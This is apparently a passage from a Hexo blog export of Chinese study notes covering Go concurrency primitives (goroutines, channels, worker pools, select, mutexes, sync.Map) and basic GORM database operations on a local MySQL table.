<h4 id="GOMAXPROCS"><a href="#GOMAXPROCS" class="headerlink" title="GOMAXPROCS"></a>GOMAXPROCS</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;runtime&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="comment">// &quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">a</span><span class="params">(k <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; k; i++ &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;hello a:&quot;</span>, i)</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Done() <span class="comment">//计数牌-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">b</span><span class="params">(k <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; k; i++ &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;hello b:&quot;</span>, i)</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Done() <span class="comment">//计数牌-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">//开启一个主goroutine去执行main</span></span><br><span class="line">	runtime.GOMAXPROCS(<span class="number">6</span>)</span><br><span class="line">	wg.Add(<span class="number">2</span>) <span class="comment">//计数牌+2</span></span><br><span class="line">	<span class="keyword">go</span> a(<span class="number">100</span>)</span><br><span class="line">	<span class="keyword">go</span> b(<span class="number">100</span>)</span><br><span class="line">	<span class="comment">// time.Sleep(time.Second)</span></span><br><span class="line"></span><br><span class="line">	wg.Wait() <span class="comment">//阻塞，等所有小弟干完活才收工</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h4><p>单纯地将函数并发执行是没有意义的。函数与函数间需要交换数据才能体现并发执行函数的意义</p>
<p>如果说<code>goroutine</code>是Go程序并发的执行体，<code>channel</code>就是它们之间的连接。<code>channel</code>是可以让一个<code>goroutine</code>发送特定值到另一个<code>goroutine</code>的通信机制。</p>
<p>Go 语言中的通道（channel）是一种特殊的类型。通道像一个传送带或者队列，总是遵循先入先出（First In First Out）的规则，保证收发数据的顺序。每一个通道都是一个具体类型的导管，也就是声明channel的时候需要为其指定元素类型。</p>
<p>1.basic</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> ch1 <span class="keyword">chan</span> <span class="keyword">int</span></span><br><span class="line">	ch1 = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">	ch1 &lt;- <span class="number">10</span></span><br><span class="line">	x := &lt;-ch1</span><br><span class="line">	fmt.Println(x)</span><br><span class="line">	<span class="built_in">close</span>(ch1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.channel + goroutine</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//单向通道，只能往里发送</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">create</span><span class="params">(c1 <span class="keyword">chan</span>&lt;- <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">		c1 &lt;- i</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">close</span>(c1)</span><br><span class="line">	wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">double</span><span class="params">(c1 &lt;-<span class="keyword">chan</span> <span class="keyword">int</span>, c2 <span class="keyword">chan</span>&lt;- <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		temp, ok := &lt;-c1</span><br><span class="line">		<span class="keyword">if</span> !ok &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		c2 &lt;- temp * temp</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">close</span>(c2)</span><br><span class="line">	wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	c1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">110</span>)</span><br><span class="line">	c2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">110</span>)</span><br><span class="line"></span><br><span class="line">	wg.Add(<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">go</span> create(c1)</span><br><span class="line">	<span class="keyword">go</span> double(c1, c2)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> ret := <span class="keyword">range</span> c2 &#123;</span><br><span class="line">		fmt.Println(ret)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="worker-pool（goroutine池）"><a href="#worker-pool（goroutine池）" class="headerlink" title="worker pool（goroutine池）"></a>worker pool（goroutine池）</h4><p>三个goroutine解决五个任务也可以的哦</p>
<p>控制<code>goroutine</code>的数量，防止<code>goroutine</code>泄漏和暴涨</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(id <span class="keyword">int</span>, jobs &lt;-<span class="keyword">chan</span> <span class="keyword">int</span>, results <span class="keyword">chan</span>&lt;- <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> j := <span class="keyword">range</span> jobs &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;worker:%d start job:%d\n&quot;</span>, id, j)</span><br><span class="line">		time.Sleep(time.Second)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;worker:%d end job:%d\n&quot;</span>, id, j)</span><br><span class="line">		results &lt;- j * <span class="number">2</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	jobs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">100</span>)</span><br><span class="line">	results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">100</span>)</span><br><span class="line">	<span class="comment">// 开启3个goroutine   worker_pool</span></span><br><span class="line">	<span class="keyword">for</span> w := <span class="number">1</span>; w &lt;= <span class="number">3</span>; w++ &#123;</span><br><span class="line">		<span class="keyword">go</span> worker(w, jobs, results)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 5个任务</span></span><br><span class="line">	<span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">5</span>; j++ &#123;</span><br><span class="line">		jobs &lt;- j</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">close</span>(jobs)</span><br><span class="line">	<span class="comment">// 输出结果</span></span><br><span class="line">	<span class="keyword">var</span> ret <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">for</span> a := <span class="number">1</span>; a &lt;= <span class="number">5</span>; a++ &#123;</span><br><span class="line">		ret = &lt;-results</span><br><span class="line">		fmt.Println(ret)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="select多路复用"><a href="#select多路复用" class="headerlink" title="select多路复用"></a>select多路复用</h4><p>好处就是可以处理多个channel，哪个channel的收发存在信息，就去处理，灵活多变</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> x := &lt;-ch:</span><br><span class="line">			fmt.Println(x)</span><br><span class="line">		<span class="keyword">case</span> ch &lt;- i:</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果是随机的，因为执行的语句也是随机的</p>
<h4 id="并发安全和锁"><a href="#并发安全和锁" class="headerlink" title="并发安全和锁"></a>并发安全和锁</h4><p>熟悉操作系统的同学懂得都懂</p>
<h5 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	x    <span class="keyword">int64</span></span><br><span class="line">	wg   sync.WaitGroup</span><br><span class="line">	lock sync.Mutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">		lock.Lock()</span><br><span class="line">		x++</span><br><span class="line">		lock.Unlock()</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	wg.Add(<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">go</span> add()</span><br><span class="line">	<span class="keyword">go</span> add()</span><br><span class="line">	wg.Wait()</span><br><span class="line">	fmt.Println(x)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="读写互斥锁"><a href="#读写互斥锁" class="headerlink" title="读写互斥锁"></a>读写互斥锁</h5><p>其实没啥东西，不需要我们设计底层，直接调用方法就好了</p>
<p>直接放上学习资料里面的例子</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	x      <span class="keyword">int64</span></span><br><span class="line">	wg     sync.WaitGroup</span><br><span class="line">	lock   sync.Mutex</span><br><span class="line">	rwlock sync.RWMutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// lock.Lock()   // 加互斥锁</span></span><br><span class="line">	rwlock.Lock() <span class="comment">// 加写锁</span></span><br><span class="line">	x = x + <span class="number">1</span></span><br><span class="line">	time.Sleep(<span class="number">10</span> * time.Millisecond) <span class="comment">// 假设读操作耗时10毫秒</span></span><br><span class="line">	rwlock.Unlock()                   <span class="comment">// 解写锁</span></span><br><span class="line">	<span class="comment">// lock.Unlock()                     // 解互斥锁</span></span><br><span class="line">	wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">read</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// lock.Lock()                  // 加互斥锁</span></span><br><span class="line">	rwlock.RLock()               <span class="comment">// 加读锁</span></span><br><span class="line">	time.Sleep(time.Millisecond) <span class="comment">// 假设读操作耗时1毫秒</span></span><br><span class="line">	rwlock.RUnlock()             <span class="comment">// 解读锁</span></span><br><span class="line">	<span class="comment">// lock.Unlock()                // 解互斥锁</span></span><br><span class="line">	wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	start := time.Now()</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> write()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++ &#123;</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> read()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wg.Wait()</span><br><span class="line">	end := time.Now()</span><br><span class="line">	fmt.Println(end.Sub(start))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="sync-Once"><a href="#sync-Once" class="headerlink" title="sync.Once"></a>sync.Once</h5><p>在编程的很多场景下我们需要确保某些操作在高并发的场景下只执行一次，例如只加载一次配置文件、只关闭一次通道等</p>
<h5 id="sync-Map"><a href="#sync-Map" class="headerlink" title="sync.Map"></a>sync.Map</h5><p>Go语言中内置的map不是并发安全的，要加锁</p>
<p>1.可以自己加锁实现</p>
<p>2.也可以使用GO语言内置的功能sync.Map</p>
<p><code>sync.Map</code>内置了诸如<code>Store</code>、<code>Load</code>、<code>LoadOrStore</code>、<code>Delete</code>、<code>Range</code>等操作方法</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">var</span> m2 = sync.Map&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">20</span>; i++ &#123;</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">			m2.Store(i, i+<span class="number">100</span>)</span><br><span class="line">			value, _ := m2.Load(i)</span><br><span class="line">			fmt.Printf(<span class="string">&quot;key:%d value:%d\n&quot;</span>, i, value)</span><br><span class="line">			wg.Done()</span><br><span class="line">		&#125;(i)</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>GORM_note</title>
    <url>/2020/03/20/GORM-note/</url>
    <content><![CDATA[<p>GO Web 冲冲冲，GORM 冲冲冲</p>
<span id="more"></span>

<p>学习资料：<a href="https://gorm.io/zh_CN/docs/">https://gorm.io/zh_CN/docs/</a>  中文文档</p>
<h3 id="创建与查询的基本操作"><a href="#创建与查询的基本操作" class="headerlink" title="创建与查询的基本操作"></a>创建与查询的基本操作</h3><p>基本的范畴我自己定的233，有一些地方为了避免多次运行注释掉了，我自己是看得懂的，如果你迷茫了，对不起，我只记录一些自己看文档的时候踩得坑</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jinzhu/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// UserInfo create对应用户表的结构体</span></span><br><span class="line"><span class="keyword">type</span> UserInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID     <span class="keyword">int</span> <span class="comment">// 一定要大写字母开头，不然无法创建处这个字段</span></span><br><span class="line">	Age    <span class="keyword">int</span></span><br><span class="line">	Name   *<span class="keyword">string</span> <span class="string">`gorm:&quot;default:&#x27;galeone&#x27;&quot;`</span> <span class="comment">//给一个默认值，但可以传入空串</span></span><br><span class="line">	Gender <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 打开mysql中名为go_test的数据库</span></span><br><span class="line">	db, err := gorm.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:xiaoyuyu@/go_test?charset=utf8&amp;parseTime=True&amp;loc=Local&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;failed to connect database&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> db.Close()</span><br><span class="line">	<span class="comment">// create table</span></span><br><span class="line">	db.AutoMigrate(&amp;UserInfo&#123;&#125;)</span><br><span class="line">	<span class="comment">// create data</span></span><br><span class="line">	str := <span class="built_in">new</span>(<span class="keyword">string</span>)</span><br><span class="line">	*str = <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	u1 := UserInfo&#123;<span class="number">1</span>, <span class="number">18</span>, str, <span class="string">&quot;male&quot;</span>&#125;</span><br><span class="line">	<span class="comment">//u2 := UserInfo&#123;Age: 22, Name: new(string), Gender: &quot;male&quot;&#125;</span></span><br><span class="line">	<span class="comment">//u3 := UserInfo&#123;Age: 25, Gender: &quot;female&quot;&#125;</span></span><br><span class="line">	<span class="comment">//fmt.Println(u3.Name)</span></span><br><span class="line">	db.Create(&amp;u1)</span><br><span class="line">	<span class="comment">// ok := db.NewRecord(u2) // 检查创建的当前字段的PRI key 是否存在</span></span><br><span class="line">	<span class="comment">// if !ok &#123;</span></span><br><span class="line">	<span class="comment">// 	fmt.Println(&quot;PRI key has been used&quot;)</span></span><br><span class="line">	<span class="comment">// &#125; else &#123;</span></span><br><span class="line">	<span class="comment">// 	db.Create(&amp;u2)</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line">	<span class="comment">// //fmt.Println(ok)</span></span><br><span class="line">	<span class="comment">// ok = db.NewRecord(u3)</span></span><br><span class="line">	<span class="comment">// if !ok &#123;</span></span><br><span class="line">	<span class="comment">// 	fmt.Println(&quot;PRI key has been used&quot;)</span></span><br><span class="line">	<span class="comment">// &#125; else &#123;</span></span><br><span class="line">	<span class="comment">// 	db.Create(&amp;u3)</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line">	<span class="comment">//fmt.Println(ok)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 查询</span></span><br><span class="line">	user := UserInfo&#123;&#125;</span><br><span class="line">	<span class="comment">// 根据主键查询第一条记录，查询出来的保存到对象user中</span></span><br><span class="line">	db.First(&amp;user)</span><br><span class="line">	<span class="comment">//// SELECT * FROM users ORDER BY id LIMIT 1;</span></span><br><span class="line">	fmt.Println(user.ID, *user.Name, user.Age, user.Gender)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果不重新定义一个空结构体，之前的查询条件会累加到现存的查询上</span></span><br><span class="line">	user = UserInfo&#123;&#125;</span><br><span class="line">	<span class="comment">// 随机获取一条记录</span></span><br><span class="line">	db.Take(&amp;user)</span><br><span class="line">	<span class="comment">//// SELECT * FROM users LIMIT 1;</span></span><br><span class="line">	fmt.Println(user.ID, *user.Name, user.Age, user.Gender)</span><br><span class="line"></span><br><span class="line">	user = UserInfo&#123;&#125;</span><br><span class="line">	<span class="comment">// 根据主键查询最后一条记录</span></span><br><span class="line">	db.Last(&amp;user)</span><br><span class="line">	<span class="comment">//// SELECT * FROM users ORDER BY id DESC LIMIT 1;</span></span><br><span class="line">	fmt.Println(user.ID, *user.Name, user.Age, user.Gender)</span><br><span class="line"></span><br><span class="line">	user2 := []UserInfo&#123;&#125;</span><br><span class="line">	<span class="comment">// 查询所有的记录</span></span><br><span class="line">	db.Find(&amp;user2)</span><br><span class="line">	<span class="comment">//// SELECT * FROM users;</span></span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> user2 &#123;</span><br><span class="line">		fmt.Println(value.ID, *value.Name, value.Age, value.Gender)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	user = UserInfo&#123;&#125;</span><br><span class="line">	<span class="comment">// 查询指定的某条记录(仅当主键为整型时可用)</span></span><br><span class="line">	db.First(&amp;user, <span class="number">3</span>)</span><br><span class="line">	<span class="comment">//// SELECT * FROM users WHERE id = 1;</span></span><br><span class="line">	fmt.Println(user.ID, *user.Name, user.Age, user.Gender)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Where 查询</span></span><br><span class="line"></span><br><span class="line">	user = UserInfo&#123;&#125;</span><br><span class="line">	<span class="comment">// Struct,map也行但是作用我觉得和struct差不多</span></span><br><span class="line">	*str = <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	db.Where(&amp;UserInfo&#123;Name: str, Age: <span class="number">18</span>&#125;).First(&amp;user)</span><br><span class="line">	<span class="comment">//// SELECT * FROM users WHERE name = &quot;jinzhu&quot; AND age = 20 LIMIT 1;</span></span><br><span class="line">	fmt.Println(user.ID, *user.Name, user.Age, user.Gender)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 主键的切片</span></span><br><span class="line">	user2 = []UserInfo&#123;&#125;</span><br><span class="line">	db.Where([]<span class="keyword">int64</span>&#123;<span class="number">1</span>, <span class="number">3</span>&#125;).Find(&amp;user2)</span><br><span class="line">	<span class="comment">//// SELECT * FROM users WHERE id IN (20, 21, 22);</span></span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> user2 &#123;</span><br><span class="line">		fmt.Println(value.ID, *value.Name, value.Age, value.Gender)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AND</span></span><br><span class="line">	user = UserInfo&#123;&#125;</span><br><span class="line">	db.Where(<span class="string">&quot;name = ? AND age &gt;= ?&quot;</span>, <span class="string">&quot;xiaoyuyu&quot;</span>, <span class="string">&quot;10&quot;</span>).Find(&amp;user)</span><br><span class="line">	<span class="comment">//// SELECT * FROM users WHERE name = &#x27;jinzhu&#x27; AND age &gt;= 22;</span></span><br><span class="line">	fmt.Println(user.ID, *user.Name, user.Age, user.Gender)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="更新与删除的基本操作"><a href="#更新与删除的基本操作" class="headerlink" title="更新与删除的基本操作"></a>更新与删除的基本操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jinzhu/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// UserInfo create对应用户表的结构体</span></span><br><span class="line"><span class="keyword">type</span> UserInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID     <span class="keyword">int</span> <span class="comment">// 一定要大写字母开头，不然无法创建处这个字段</span></span><br><span class="line">	Age    <span class="keyword">int</span></span><br><span class="line">	Name   *<span class="keyword">string</span> <span class="string">`gorm:&quot;default:&#x27;galeone&#x27;&quot;`</span> <span class="comment">//给一个默认值，但可以传入空串</span></span><br><span class="line">	Gender <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 打开mysql中名为go_test的数据库</span></span><br><span class="line">	db, err := gorm.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:xiaoyuyu@/go_test?charset=utf8&amp;parseTime=True&amp;loc=Local&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;failed to connect database&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> db.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create table 要是表已经存在，不会新创建，二十直接调用</span></span><br><span class="line">	db.AutoMigrate(&amp;UserInfo&#123;&#125;)</span><br><span class="line">	str := <span class="built_in">new</span>(<span class="keyword">string</span>)</span><br><span class="line">	*str = <span class="string">&quot;dawa&quot;</span></span><br><span class="line">	user := UserInfo&#123;ID: <span class="number">7</span>, Age: <span class="number">30</span>, Name: str, Gender: <span class="string">&quot;unknown&quot;</span>&#125;</span><br><span class="line">	db.Create(&amp;user)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Save 更新，Save会更新所有字段，即使你没有赋值</span></span><br><span class="line">	user = UserInfo&#123;&#125;</span><br><span class="line">	db.First(&amp;user, <span class="number">7</span>)</span><br><span class="line">	user.Gender = <span class="string">&quot;male&quot;</span></span><br><span class="line">	db.Save(&amp;user)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 更新单个属性，如果它有变化</span></span><br><span class="line">	db.Model(&amp;user).Update(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;zhuzhu&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 用struct或者map更新多个值，只会更新其中有变化且为非零值的字段</span></span><br><span class="line">	*str = <span class="string">&quot;xiaokeai&quot;</span></span><br><span class="line">	db.Model(&amp;user).Updates(UserInfo&#123;Name: str, Age: <span class="number">50</span>&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 批量更新</span></span><br><span class="line">	db.Table(<span class="string">&quot;user_infos&quot;</span>).Where(<span class="string">&quot;name IN (?)&quot;</span>, []<span class="keyword">string</span>&#123;<span class="string">&quot;&quot;</span>, <span class="string">&quot;galeone&quot;</span>&#125;).Updates(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>&#125;)</span><br><span class="line">	<span class="comment">//// UPDATE users SET name=&#x27;hello&#x27;, age=18 WHERE id IN (10, 11);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用 `RowsAffected` 获取更新记录总数</span></span><br><span class="line">	num := db.Table(<span class="string">&quot;user_infos&quot;</span>).Where(<span class="string">&quot;name IN (?)&quot;</span>, []<span class="keyword">string</span>&#123;<span class="string">&quot;luck&quot;</span>&#125;).Updates(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lucky&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">23</span>&#125;).RowsAffected</span><br><span class="line">	fmt.Println(num)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 删除</span></span><br><span class="line">	db.Where(<span class="string">&quot;name = ?&quot;</span>, <span class="string">&quot;lucky&quot;</span>).Delete(UserInfo&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Model-模型的定义"><a href="#Model-模型的定义" class="headerlink" title="Model 模型的定义"></a>Model 模型的定义</h3><p>在GORM中模型（Models）通常是正常定义的结构体、基本的go类型或它们的指针</p>
<p>先看一下本身自带的Model</p>
